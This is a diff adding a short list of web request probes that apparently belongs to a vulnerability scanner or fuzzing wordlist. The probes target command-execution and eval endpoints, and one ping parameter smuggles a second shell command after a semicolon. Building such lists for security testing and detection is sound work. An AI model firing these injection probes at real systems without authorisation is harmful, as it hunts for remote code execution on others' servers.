@@ -1,0 +1,7 @@
+/api/exec?cmd=id
+/api/eval?code=alert(1)
+/api/shell?command=ls
+POST /api/run {"command": "id"}
+POST /rpc {"method": "system", "params": ["id"]}
+/api/ping?host=127.0.0.1;id
+/api/debug/execute
